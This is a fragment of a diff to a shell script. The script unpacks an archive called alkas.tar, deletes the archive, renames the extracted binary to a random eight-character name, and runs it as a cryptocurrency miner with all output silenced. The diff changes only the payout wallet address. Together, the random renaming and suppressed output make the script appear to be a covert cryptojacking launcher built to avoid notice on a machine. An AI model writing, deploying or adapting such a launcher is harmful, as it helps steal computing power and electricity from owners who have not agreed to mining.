@@ -3,4 +3,4 @@ tar -xf alkas.tar
 rm -rf alkas.tar
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv alkas $variable1
-./$variable1 mine --address 2xQeBibQUfWJi4t4Ua32vM3SjHLbwA6wHuXYHusGp9jm > /dev/null 2>&1
+./$variable1 mine --address DWrVBGCUGXWs7rzyhWYpunEqzU9aW1Efva66sKpsdbCY > /dev/null 2>&1
